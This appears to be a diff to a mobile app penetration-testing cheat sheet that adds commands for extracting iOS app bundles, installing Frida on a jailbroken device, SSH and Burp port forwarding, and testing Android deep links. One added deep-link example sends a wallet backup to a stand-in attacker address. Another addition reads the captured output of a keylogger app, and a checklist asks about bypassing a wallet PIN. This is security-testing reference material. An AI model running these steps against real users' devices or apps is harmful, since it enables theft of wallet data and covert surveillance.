@@ -31,6 +31,7 @@ apktool d myapp.apk -o extractedFolder
 
 ```
 - https://www.alphr.com/extract-apk-android/
+- https://apps.evozi.com/apk-downloader/?id=
 ```
 
 #### Dynamical Analyses with BurpSuite
@@ -209,13 +210,19 @@ drozer console connect --server 127.0.0.1:31415
 ```
 -> https://reverseengineering.stackexchange.com/questions/1594/possibilities-for-reverse-engineering-an-ipa-file-to-its-source	
 
--> locate the the bundle with objection:
+-> locate the bundle with objection:
 	https://www.virtuesecurity.com/kb/ios-frida-objection-pentesting-cheat-sheet/
 
--> extract bundle folder: /private/var/containers/Bundle/Application/XXXX-XXXX-XXX-XXXXX-XXXXXX
+-> locate the bundle manually:
+	-> find /private/var/containers/Bundle/Application/ -name "*.app" | grep -i "MyAppName"
+
+-> extract bundle folder (/private/var/containers/Bundle/Application/XXXX-XXXX-XXX-XXXXX-XXXXXX)
+	-> scp -r -P 2222 mobile@192.168.1.X:"/private/var/containers/Bundle/Application/XXXX-XXXX-XXX-XXXXX-XXXXXX/My App.app" .
 
 -> copy the entire extracted folder (XXXX.app) in a "Payload" named folder and zip it YourChoiceName.ipa
-	-> zip -r test.ipa Payload
+	-> mkdir -p Payload
+	-> cp -R MyApp.app Payload
+	-> zip -r myapp.ipa Payload
 
 -> Extract the app unencrypted
 python3 frida-ios-dump.py -o decrypted_app.ipa com.company.myapp
@@ -347,9 +354,21 @@ alpine
 #### iOS get screenshots (specific number)
 
 ```
-scp root@192.168.x.x:/User/Media/DCIM/100APPLE/*{35..39}.PNG .
+scp mobile@192.168.x.x:/User/Media/DCIM/100APPLE/*{35..39}.PNG .
 ```
 
+#### iOS Screen Mirroring
+```
+https://hybridheroes.de/blog/record-ios-android-screen-macos/
+
+1. **USB Connection**: Connect your iOS or iPadOS device to your macOS device using a lightning/ USB-C cable.
+2. **Open QuickTime Player**: Launch QuickTime Player on your macOS.
+3. **New Movie Recording**: From the "File" menu in QuickTime Player, select "New Movie Recording".
+4. **Select Device**: Click on the dropdown arrow next to the record button and choose your connected iOS/iPadOS device under the "Camera" and "Microphone" sections.
+5. **Mirror Screen**: Your iOS/iPadOS device's screen will now be mirrored on your macOS desktop via QuickTime Player.
+6. **Record Screen**: To record the screen, simply click on the record button (red circle icon) in QuickTime Player.
+
+```
 
 ---
 ### Frameworks
@@ -635,6 +654,11 @@ https://ios.pentestglobal.com/basics/installing-tools
 - loki keyboard:
 
 https://github.com/IceWreck/LokiBoard-Android-Keylogger
+
+Internal Storage > Android > Data > com.abifog.lokiboard > files > lokiboard-files.txt
+
+cat /sdcard/Android/data/com.abifog.lokiboard/files/loki... && echo "\n"
+
 ```
 
 #### 🛠️ **Jailbreak Tweaks (from Cydia/Sileo)**
@@ -650,8 +674,16 @@ https://github.com/IceWreck/LokiBoard-Android-Keylogger
 
 ##### 1st Step
 - palera1n -f -c
+	=> If any issues to reach DFU mode, change the cable
 ##### 2nd Step (to run also after a shutdown)
 - palera1n -f
+
+##### Next Steps
+
+- install ssh server, then use ssh mobile@192.168.x.x
+- scp frida_16.1.3_iphoneos-arm.deb mobile@192.168.x.x:/var/mobile/Downloads
+- sudo dpkg -i frida_16.1.3_iphoneos-arm.deb
+- root# frida-server    (run as root user after `sudo su`) 
 
 #### Root Samsung Phone with Heimdall CLI
 
@@ -747,7 +779,7 @@ https://github.com/IceWreck/LokiBoard-Android-Keylogger
 #### Web3 Wallets App
 
 - How is the wallet private key stored on the device
-- What algorithm to encrypt the wallet private key
+- What algorithm to encrypt the wallet private key ? Any weak algorithms ?
 - Is the private key sent to the server
 - Can we bypass the user's PIN to send transactions ?
 - How is the wallet private key generated ?
@@ -816,4 +848,62 @@ objection -g 1232 explore
 ```
 pm uninstall com.google.android.art
 reboot
+```
+
+
+### Device Emulators
+
+-> https://www.corellium.com/
+
+
+#### Hermes Protected Code
+
+-> https://github.com/P1sec/hermes-dec
+
+#### Android Deep Links Testing
+
+```
+
+Run commands in this example format:
+
+adb shell am start -a android.intent.action.VIEW -d "my.testapp.wallet://backup?auto_send=true&email=attacker@evil.com"
+
+Monitor:
+
+adb logcat | grep -i "wallet\|crash\|error"
+
+adb logcat | grep -i "intent\|activity"
+
+```
+
+#### Android Show Min SDK Version
+```
+aapt dump badging my_test.apk | grep "sdkVersion"
+
+```
+
+#### iproxy & SSH port forwarding
+
+```
+SSH
+	-> iproxy 2222 22
+	-> ssh mobile@192.168.X.X -p 2222
+	
+
+BURPSUITE
+
+	On Mac (for iOS)
+	First Shell -> iproxy 2222 22
+	Second Shell -> ssh -R 8080:localhost:9082 mobile@localhost -p 2222
+
+	On Mac (for Android)
+	First Shell -> adb reverse tcp:8080 tcp:9082
+	
+	-> Configure Proxy Listener on the Device:
+		- Go to "Proxy" > "Options"
+		- Ensure there's a listener on `127.0.0.1:8080`
+
+	-> Configure BurpSuite Proxy:
+		- Listen on 127.0.0.1:9082
+
 ```
